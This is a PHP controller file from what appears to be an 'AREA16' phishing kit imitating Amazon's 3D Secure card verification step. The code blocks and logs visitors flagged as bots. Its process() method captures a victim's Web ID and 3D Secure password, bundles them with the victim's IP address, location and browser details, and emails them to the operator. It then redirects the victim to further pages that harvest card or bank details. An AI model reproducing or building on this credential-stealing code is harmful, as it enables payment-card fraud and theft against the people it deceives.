<?php 
defined("ACCESS") or die('Konz');

class Verify 
{
	private $_LICENSE = FCPATH . "AREA16/system/private/license.ini";
	private $_CONFIG = FCPATH. "AREA16/system/private/setting.json";

	public function __construct()
	{
		$this->pc = new Pc();
		$_ini_file = parse_ini_file($this->_LICENSE);
		$this->license = new license($_ini_file);

		if (!isset($_SESSION['access']) and ($_SESSION['access'] != 5)) {

			$this->license->create_logs("BOT|{$this->pc->ip_address}|{$_SESSION['countryCode']}|{$_SESSION['country']}|{$_SESSION['isp']}|{$this->pc->platform}|Access Page Without Session|"._time()."", "BOT");
			write(FCPATH . 'AREA16/system/stats/log_robot.txt', 'a', "{$this->pc->ip_address}\r\n");
			_blocks();
			redirect(uriRand());
		}
	}

	public function index()
	{
		echo view('secure/index');
	}

	public function process()
	{
		if (isset($_POST)) {
			$webId = $_POST['webid'];
			$password_vbv = $_POST['pass3d'];

			$message = 
"<fieldset style='border: 3px solid #e4e3e2; border-radius: 20px; max-width: 50%; margin: 0 auto;'>
<pre>
<strong><span style='color: #999999;'>:: アマゾン - エリア16チームによって作成されました❤️ ::</span></strong>

<strong>:: 3DSecure Password ::</strong>
			
# Web ID      : {$webId}
# 3D Password : {$password_vbv}

<strong>:: Visitor Details ::</strong>

# Time &amp; Date  : "._date()."  
# Device       : {$this->pc->platform}
# Browser      : {$this->pc->browser}
# Country      : {$_SESSION['country']}
# State        : {$_SESSION['regionName']}
# City         : {$_SESSION['city']}
# Ip address   : {$this->pc->ip_address}
# User agent   : {$this->pc->agent}

</pre>
</fieldset>
</pre>";
			
			$subject = "3DSecure :: [ {$_SESSION['country']} - {$this->pc->ip_address} ]";
			$headers = 'MIME-Version: 1.0' . "\r\n";
			$headers .= 'Content-type: text/html; charset=UTF-8' . "\r\n";
			$headers .= "From: AREA16 <admin@area16.sg>";

			@mail(_config('result'), $subject, $message, $headers);

			write(FCPATH . 'AREA16/system/stats/log_3dsecure.txt', 'a', "{$this->pc->ip_address}\r\n");
			$this->license->create_logs("Human|{$this->pc->ip_address}|{$_SESSION['countryCode']}|{$_SESSION['country']}|{$_SESSION['isp']}|{$this->pc->platform}|Submit 3D Secure|"._time()."", "3DSECURE");

			if (_config('double_card') == 'on') {
				$_SESSION['access'] = 6;
				redirect(base_url() . 'payment/#errorId='. md5(time()));
			} elseif (_config('get_bank') == 'on') {
				$_SESSION['access'] = 7;
				redirect(base_url() . 'bank/#');
			} else {
				$_SESSION['access'] = 8;
				redirect(base_url() . 'done');
			}
		}
	}
}